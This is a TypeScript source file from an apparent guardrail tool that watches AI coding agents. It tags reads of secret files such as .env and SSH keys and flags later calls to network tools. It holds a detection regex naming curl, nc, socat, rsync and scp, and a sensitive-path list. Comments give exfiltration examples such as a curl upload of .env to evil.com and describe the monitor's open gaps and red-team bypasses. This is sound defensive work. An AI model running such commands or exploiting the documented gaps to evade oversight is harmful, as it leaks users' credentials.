import type { KeelRule, EnforceInput } from '../types.js'
import { existsSync, readFileSync } from 'node:fs'
import { resolveMaybeRelative, canonicalizePath } from './path-normalize.js'
import { argPath } from './arg-utils.js'
import type { PersistentFlowStore } from './flow-store.js'

interface DataTag {
  source: string     // matched source path or source tool
  value: string      // the sensitive content (truncated for privacy)
  timestamp: number
  sessionId: string
  originTool: string
  path?: string
}

/**
 * Simplified information flow control tracker.
 *
 * Tags data as it flows through tools. When a tool reads
 * a sensitive file, the output is tagged. If a network tool
 * later receives tagged data, a rule violation is triggered.
 *
 * This is a lightweight version of Microsoft Fides.
 *
 * IN-MEMORY BY DEFAULT: `taggedValues`/`tagOrigins` live only in this
 * instance, constructed once per pipeline — that's fine for a long-lived
 * host (the OpenCode plugin, `keel daemon`) that holds one FlowTracker open
 * for a whole session, but means `check()` (below) can only ever see a read
 * and a sink that both happened inside the SAME live process. For
 * `keel hook <host>` — a fresh process, and a fresh, empty FlowTracker, per
 * tool call — that makes cross-call correlation inert beyond a single
 * command that itself pipes a read into a sink. See docs/exfil.md's
 * "Coverage depends on which host integration you use".
 *
 * The OPTIONAL `persistentStore` constructor argument closes that gap
 * additively, without changing `check()`'s existing in-memory-only
 * behavior at all: when supplied, `record()` ALSO writes matching tags to
 * `PersistentFlowStore` (flow-store.ts) — a disk-backed, session-scoped,
 * TTL'd, file-locked store a LATER process's FlowTracker instance (same
 * `persistentStore` directory, same session_id) can read back via the new
 * `checkPersisted()` method. `check()` itself is untouched on purpose: it
 * backs the existing `level: protect` `no-exfil-flow` deny, which must not
 * silently grow a materially wider (cross-process, TTL-wide) false-positive
 * surface. `checkPersisted()` backs a separate, warn/observe-tier sibling
 * rule instead — see install.ts's `no-exfil-flow-cross-call` and
 * docs/exfil.md.
 */
function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

/**
 * Heredoc operator (`<<`/`<<-`, quoted or bare delimiter), any preceding
 * command — deliberately NOT gated to interpreter commands the way
 * command-normalizer.ts's own heredoc extraction (`HEREDOC_START_RE`) is
 * gated: that one exists to EXPOSE a heredoc body as a matching surface for
 * interpreter-body rules (`python3 <<'EOF'` genuinely executes its body as
 * code), so it only fires when the preceding token IS a recognized
 * interpreter. This regex still needs to find EVERY heredoc operator,
 * interpreter or not — `stripHeredocBodies()` below decides per-match
 * whether to strip, using its own lightweight lookback (`heredocInterpreter()`)
 * rather than requiring the interpreter token to sit immediately at a
 * command-start boundary the way `HEREDOC_START_RE` does (that stricter
 * anchoring is what lets this same operator also match `cat >> file <<'EOF'`,
 * where the invoking command is not immediately adjacent to `<<`).
 */
const HEREDOC_OPERATOR_RE =
  /<<(-)?[ \t]*(?:'([A-Za-z_][A-Za-z0-9_]*)'|"([A-Za-z_][A-Za-z0-9_]*)"|([A-Za-z_][A-Za-z0-9_]*))/g

/**
 * Recognizes the same interpreter classes as command-normalizer.ts's
 * private `classifyInterpreter()` (shell / python / node / perl) — kept as
 * its own local, non-exported check rather than importing that function,
 * since it isn't exported and this module's use case (deciding whether to
 * SUPPRESS a heredoc body from sink matching) is the mirror image of that
 * function's (deciding whether to EXPOSE one to interpreter-body rules),
 * not a call site of it.
 */
const HEREDOC_INTERPRETER_RE = /^(?:sh|bash|dash|zsh|ksh|fish|csh|tcsh|ash|python[0-9.]*|node|nodejs|perl[0-9.]*)$/

/**
 * Best-effort: does ANY whitespace-separated token in the same command
 * segment preceding the `<<` operator at `matchStart` (since the last
 * `;`/`&`/`|`/newline/`&&`/`||` separator, or start of string) resolve to a
 * recognized interpreter? Deliberately checks every token in the segment,
 * not just the one immediately adjacent to `<<` — a prefix like `env`,
 * `timeout 5`, `nice`, or `ssh host` sits between the real interpreter and
 * the operator (`env python3 <<'PY'`, `timeout 5 bash <<'SH'`), exactly the
 * same argv0-obfuscation idiom `no-destructive-interpreter-body` and
 * `scripts/redteam/round2.mjs` already catalog for THIS codebase's other
 * interpreter-body rule — requiring strict adjacency here would open a new
 * bypass that a matching prefix-stripped command would already be denied
 * for elsewhere. Scanning the whole segment is deliberately permissive in
 * the OTHER direction too (a stray word that happens to collide with an
 * interpreter name anywhere in the segment also counts as "don't strip") —
 * that is the safe direction to be wrong in: under-stripping can only
 * reintroduce an already-pre-existing-elsewhere prose false positive,
 * while over-stripping can hide a genuine sink invocation on a
 * `level: protect` floor.
 */
function heredocInterpreterPrecedes(command: string, matchStart: number): boolean {
  const before = command.slice(0, matchStart)
  const segment = before.split(/(?:[;&|\n]|&&|\|\|)/).pop() || before
  return segment.split(/[ \t]+/).some(tok => {
    if (!tok) return false
    const basename = tok.split(/[\\/]/).pop() || tok
    return HEREDOC_INTERPRETER_RE.test(basename)
  })
}

/**
 * Removes heredoc BODY text (the lines between the operator and the
 * matching delimiter line) from `command`, leaving the invoking command
 * text intact — EXCEPT for a heredoc whose invoking command is a
 * recognized interpreter (`bash <<'SH'`, `python3 <<'PY'`, ...), which is
 * left untouched: unlike `cat >> file <<'EOF'` (body is inert data, never
 * executed), an interpreter heredoc's body genuinely RUNS as real code, so
 * a sink verb inside it is a real invocation, not descriptive prose — see
 * `heredocInterpreterPrecedes()`. Best-effort: an unterminated/malformed
 * heredoc is left as-is rather than throwing or over-stripping.
 */
function stripHeredocBodies(command: string): string {
  let result = ''
  let cursor = 0
  HEREDOC_OPERATOR_RE.lastIndex = 0
  let m: RegExpExecArray | null
  while ((m = HEREDOC_OPERATOR_RE.exec(command))) {
    const tabStrip = m[1] === '-'
    const delim = m[2] ?? m[3] ?? m[4]
    const opLineEnd = command.indexOf('\n', HEREDOC_OPERATOR_RE.lastIndex)
    if (!delim || opLineEnd === -1) continue // no body on this line: nothing to strip

    const bodyStart = opLineEnd + 1
    const rest = command.slice(bodyStart)
    const delimLineRe = new RegExp('^' + (tabStrip ? '\\t*' : '') + escapeRegExp(delim) + '[ \\t]*$', 'm')
    const end = delimLineRe.exec(rest)
    if (!end) continue // unterminated heredoc: best-effort, leave as-is

    const bodyEnd = bodyStart + end.index + end[0].length
    if (heredocInterpreterPrecedes(command, m.index)) {
      // Interpreter heredoc: body genuinely executes, leave it visible to
      // the sink regex — do not add it to the stripped ranges.
      HEREDOC_OPERATOR_RE.lastIndex = bodyEnd
      continue
    }
    result += command.slice(cursor, opLineEnd)
    cursor = bodyEnd
    HEREDOC_OPERATOR_RE.lastIndex = bodyEnd
  }
  result += command.slice(cursor)
  return result
}

export class FlowTracker {
  private taggedValues: Map<string, DataTag[]> = new Map()
  // tag_key → tool name that created the tag
  private tagOrigins: Map<string, string> = new Map()

  constructor(private readonly persistentStore?: PersistentFlowStore) {}

  /**
   * Track a tool call — check if it reads sensitive data
   * or sends tagged data to a network sink.
   */
  record(input: EnforceInput, rule?: KeelRule | string): void {
    const args = input.args as Record<string, unknown>

    // Check if this tool reads a sensitive file. `argPath()` (arg-utils.ts)
    // is the same helper that fixed `no-rules-tampering` and friends for
    // Claude Code / Gemini CLI (see SECURITY.md: those hosts send
    // `file_path`, snake_case, in their native Read tool call — a plain
    // `args.path || args.file || args.filePath` check this used to be
    // never matches it, so a native Read of `.env` on those hosts never
    // tagged a source and `no-exfil-flow` could never fire from it,
    // independent of anything else about this rule. Verified empirically
    // before this fix: a `Read` call with `{ file_path: '.../.env' }`
    // followed by an exfil-shaped sink in the SAME in-process pipeline
    // (i.e. the one architecture where cross-call state persists at all —
    // see docs/exfil.md) still allowed.
    const rawPath = argPath(args)
    const path = resolveMaybeRelative(rawPath, input.cwd)
    if (path && existsSync(path)) {
      const configuredSources = typeof rule === 'object' ? rule.sources : undefined
      const matchedRule = configuredSources?.find(source => this.pathMatches(path, source))
        || (!configuredSources ? this.matchesSensitivePath(path) : null)
      if (matchedRule) {
        // Tag the output of this tool call
        const tag: DataTag = {
          source: matchedRule,
          value: `<redacted: ${path}>`,
          timestamp: Date.now(),
          sessionId: input.session_id,
          originTool: input.tool,
          path,
        }
        const key = `flow:${input.session_id}:${input.turn_number}`
        const existing = this.taggedValues.get(key) || []
        existing.push(tag)
        this.taggedValues.set(key, existing)
        this.tagOrigins.set(key, input.tool)

        // Cross-process persistence — see the class doc comment above and
        // flow-store.ts. Gated on `typeof rule === 'object'` (a real,
        // specific configured flow rule, not the generic per-call sweep at
        // pipeline.ts's `record(input, '')`, nor the post-violation
        // bookkeeping calls that pass `rule.id` — a plain string — at
        // pipeline.ts's `violation()`/`warn()`). Those other call sites
        // already run on every action for unrelated reasons; persisting
        // from all of them too would write 2-3x redundant copies of the
        // same real read event to disk.
        if (this.persistentStore && typeof rule === 'object') {
          this.persistentStore.recordTag(input.session_id, {
            source: matchedRule,
            timestamp: tag.timestamp,
            originTool: input.tool,
            path,
          })
        }
      }
    }

    // Bash-native reads: `cat .env`, `base64 .env`, `grep -r SECRET .env` —
    // the file never appears in a path argument, only inside the command
    // string, so the classic `cat .env | curl …` exfil was invisible.
    // Download/sink verbs (curl, wget, dd) are deliberately NOT read verbs:
    // a sink command that merely references a sensitive path (uploading a
    // file, or downloading one) must not tag itself as a source — the flow
    // violation has to come from an actual prior read.
    const command = String(args.command || args.cmd || '')
    if (command && /(?:^|[\s;&|(])(?:cat|less|more|head|tail|grep|awk|sed|strings|xxd|base64|tac|tail)\b/.test(command)) {
      const configuredSources = typeof rule === 'object' ? rule.sources : undefined
      const commandSource = configuredSources
        ? configuredSources.find(source => this.commandSourceMatches(command, source))
        : this.matchesSensitivePath(command)
      if (commandSource) {
        const key = `flow:${input.session_id}:${input.turn_number}`
        const existing = this.taggedValues.get(key) || []
        const commandTimestamp = Date.now()
        existing.push({
          source: commandSource,
          value: `<redacted: command read of sensitive path>`,
          timestamp: commandTimestamp,
          sessionId: input.session_id,
          originTool: input.tool,
        })
        this.taggedValues.set(key, existing)
        this.tagOrigins.set(key, input.tool)

        // Cross-process persistence — same gate and rationale as the
        // path-based branch above.
        if (this.persistentStore && typeof rule === 'object') {
          this.persistentStore.recordTag(input.session_id, {
            source: commandSource,
            timestamp: commandTimestamp,
            originTool: input.tool,
          })
        }
      }
    }

    // Clean up old tags (keep last 1000)
    if (this.taggedValues.size > 1000) {
      const oldest = Array.from(this.taggedValues.keys()).sort()[0]
      this.taggedValues.delete(oldest)
      this.tagOrigins.delete(oldest)
    }
  }

  /**
   * Check if a flow/IFC rule is violated by the current action.
   * Returns violation message or null.
   */
  check(input: EnforceInput, rule: KeelRule): string | null {
    if (!rule.sources || !rule.sinks) return null

    const args = input.args as Record<string, unknown>
    const tool = input.tool

    // Check if this tool is a sink (network, write, etc.)
    const isSink = rule.sinks.some(sink => this.matchesSink(sink, tool, args))

    if (!isSink) return null

    // Check if there are any tagged values from source tools
    let hasSourceData = false

    for (const [key, tags] of this.taggedValues) {
      if (tags.some(tag => tag.sessionId === input.session_id && rule.sources!.some(source =>
        tag.originTool.toLowerCase().includes(source.toLowerCase())
        || (!!tag.path && this.pathMatches(tag.path, source))
        || (!!tag.source && this.sourceMatches(source, tag.source))
      ))) {
        hasSourceData = true
        break
      }
    }

    if (hasSourceData) {
      const sources = rule.sources.join(', ')
      const sinks = rule.sinks.join(', ')
      return `Data flow violation: data from ${sources} flowing to ${sinks} (rule: ${rule.id})`
    }

    return null
  }

  /**
   * Cross-call correlation for hook-invoked hosts (`keel hook <host>` —
   * Claude Code, Gemini CLI, Cursor, Codex, cline, generic): a fresh
   * process per tool call means `check()`'s in-memory `taggedValues` is
   * always empty at the start of a later call, so it can never see a read
   * an EARLIER, already-exited process recorded. This method answers the
   * identical question — "did a source get tagged this session, and is
   * this call a sink" — against the persisted, session-scoped, TTL'd store
   * (flow-store.ts) instead, so that earlier process's tag is still
   * visible here.
   *
   * Deliberately NOT folded into `check()`: `check()` backs the existing
   * `level: protect` `no-exfil-flow` deny, a hard, undialable floor (see
   * docs/exfil.md's "Design choice" section for why that stays a hard
   * deny). Cross-process correlation has a materially wider
   * false-positive shape — it survives an hour (FLOW_TAG_TTL_MS), not one
   * live process/command — and is deliberately shipped at a softer tier
   * instead: see install.ts's `no-exfil-flow-cross-call` (action: warn,
   * level: sprint, cross_call: true). Returns null when no persistent
   * store was supplied to the constructor (every `new FlowTracker()` call
   * site that predates this — the default stays pure in-memory) exactly
   * like `check()` returns null when `rule.sources`/`rule.sinks` are
   * missing.
   */
  checkPersisted(input: EnforceInput, rule: KeelRule): string | null {
    if (!this.persistentStore || !rule.sources || !rule.sinks) return null

    const args = input.args as Record<string, unknown>
    const tool = input.tool

    const isSink = rule.sinks.some(sink => this.matchesSink(sink, tool, args))
    if (!isSink) return null

    const tags = this.persistentStore.getTags(input.session_id)
    const hasSourceData = tags.some(tag => rule.sources!.some(source =>
      tag.originTool.toLowerCase().includes(source.toLowerCase())
      || (!!tag.path && this.pathMatches(tag.path, source))
      || (!!tag.source && this.sourceMatches(source, tag.source))
    ))

    if (!hasSourceData) return null

    const sources = rule.sources.join(', ')
    const sinks = rule.sinks.join(', ')
    return `Cross-call data flow correlation (this session, an earlier hook process): data from ${sources} flowing to ${sinks} (rule: ${rule.id})`
  }

  /**
   * Does a read command reference a configured source pattern? Both checks
   * require a non-identifier boundary adjacent to the match — a bare
   * `.includes()` let an unrelated word that merely CONTAINS the pattern
   * as a substring count as a real path reference. Measured false
   * positive: a `grep os.environ ...` search (a Python attribute lookup,
   * not a file read) satisfied the dotenv source pattern because
   * `"os.environ".includes(".env")` is true, tagging the session as having
   * read a secret file it never touched — see session/EVIDENCE or the
   * commit that added this comment for the full incident.
   *
   * Two different boundary shapes are needed depending on the pattern:
   *
   * - Dotfile / name-prefix patterns (`.env*`, `.ssh/`, `.npmrc`, ...) name
   *   a COMPLETE basename or directory — a genuine reference always has a
   *   path separator or start-of-token immediately BEFORE it (`cat .env`,
   *   `/home/.ssh/id_rsa`), while the false-positive shape has an
   *   alphanumeric immediately before (`.env` inside "os.environ").
   *   `(?<![A-Za-z0-9_])` (LEADING boundary) rejects the false positive
   *   while keeping genuine matches.
   * - Extension-wildcard patterns (`*.pem`) name a wildcard basename plus a
   *   FIXED extension — a genuine reference (`server.pem`, `id.pem`)
   *   always has an ordinary filename character immediately BEFORE the
   *   extension, so a leading-boundary requirement would reject every real
   *   match. These instead require a TRAILING boundary
   *   (`(?![A-Za-z0-9_])`, nothing alphanumeric immediately after) — which
   *   still rejects a mid-identifier embedding on the trailing side. This
   *   is deliberately NOT applied to dotfile patterns too: doing so would
   *   reintroduce an equally real false positive (`grep "process.env" ...`
   *   — a bare trailing match with nothing alphanumeric following either).
   */
  private commandSourceMatches(command: string, pattern: string): boolean {
    const stripped = pattern.replace(/\*\*/g, '').replace(/\*/g, '')
    const base = stripped.split('/').filter(Boolean).pop() || stripped
    const lastSegment = pattern.replace(/\*\*/g, '').split('/').filter(Boolean).pop() || ''
    const isExtensionPattern = /^\*\.[A-Za-z0-9]+$/.test(lastSegment)
    const hasBoundaryMatch = (needle: string): boolean => {
      if (!needle) return false
      try {
        const re = isExtensionPattern
          ? new RegExp(`${escapeRegExp(needle)}(?![A-Za-z0-9_])`)
          : new RegExp(`(?<![A-Za-z0-9_])${escapeRegExp(needle)}`)
        return re.test(command)
      } catch {
        return command.includes(needle)
      }
    }
    return hasBoundaryMatch(stripped) || (base.length > 2 && hasBoundaryMatch(base))
  }

  /**
   * Does a tag's recorded source satisfy a rule source pattern? Path patterns
   * match as globs; rule-less eager tags carry pseudo-sources like
   * `sensitive-path:.env` that are compared by basename instead.
   */
  private sourceMatches(pattern: string, value: string): boolean {
    if (this.pathMatches(value, pattern)) return true
    const pBase = pattern.replace(/\*\*/g, '').replace(/\*/g, '').split('/').filter(Boolean).pop() || ''
    const vBase = value.replace(/^sensitive-path:/, '').split(/[/.]/).filter(Boolean).pop() || ''
    return pBase.length > 2 && vBase.length > 2 && (pBase === vBase || value.includes(pBase))
  }

  private matchesSensitivePath(path: string): string | null {
    // Common sensitive paths (all `/`-authored, so canonicalize the real
    // filesystem `path` — which is `\`-separated on Windows — before the
    // substring check; otherwise `.ssh/` never matches a resolved
    // `C:\Users\x\.ssh\id_rsa`).
    const normalizedPath = canonicalizePath(path)
    const sensitivePaths = [
      '.env', '.env.local', '.env.production',
      '.git-credentials', '.ssh/',
      'id_rsa', 'id_ed25519',
      'credentials', 'secrets',
      'token', 'api-key', 'apikey',
    ]
    for (const s of sensitivePaths) {
      if (normalizedPath.includes(s)) return `sensitive-path:${s}`
    }
    return null
  }

  private pathMatches(value: string, pattern: string): boolean {
    // Separator-normalize both sides (Windows: `\` -> `/`, UNC preserved)
    // before building the regex. Case-insensitivity is unchanged from the
    // existing behavior (the `i` flag below, already applied on every
    // platform — not a Windows-specific change).
    const normalizedValue = canonicalizePath(value)
    const escaped = canonicalizePath(pattern)
      .replace(/[.+^${}()|[\]\\]/g, '\\$&')
      .replace(/\*/g, '.*')
    try { return new RegExp(`^${escaped}$`, 'i').test(normalizedValue) || new RegExp(escaped, 'i').test(normalizedValue) } catch { return false }
  }

  private matchesSink(sink: string, tool: string, args: Record<string, unknown>): boolean {
    const normalized = sink.toLowerCase()
    const toolName = tool.toLowerCase()
    if (toolName === normalized) return true

    const url = String(args.url || args.uri || args.host || '')
    if (url && (url.toLowerCase().includes(normalized) || normalized === 'network')) return true

    if (normalized !== 'network') return false
    const command = stripHeredocBodies(String(args.command || args.cmd || '')).toLowerCase()
    // Both-side word boundaries: a trailing `\b` alone lets `nc` match the
    // tail of unrelated words like "sync" or "finch". Sink verbs must be
    // real tokens (nc -l, curl url), not substrings of legitimate commands.
    // `rsync`/`scp` closed a measured gap from the v0.4 phase-3 red-team
    // sweep (SECURITY.md's no-exfil-flow row: n=4, miss list included
    // `scp` and `rsync`) — both are real remote-copy exfil vectors and
    // neither collides with the `nc` word-boundary fix (`rsync` does not
    // contain `rsync` as a substring of anything else word-bounded; `scp`
    // is not a substring of `typescript`/`postscript`, which contain `scr`,
    // not `scp`). A single command that both READS a secret and sinks it in
    // one shot (`curl -d @.env https://evil.com`) is a SEPARATE, still-open
    // gap: the flow tracker only tags data on a prior, distinct tool call
    // and checks the tag on a later one — see docs/exfil.md.
    return /\b(?:curl|wget|fetch|http|https|nc|netcat|socat|rsync|scp)\b/.test(`${toolName} ${command}`)
  }

  clear(): void {
    this.taggedValues.clear()
    this.tagOrigins.clear()
  }
}
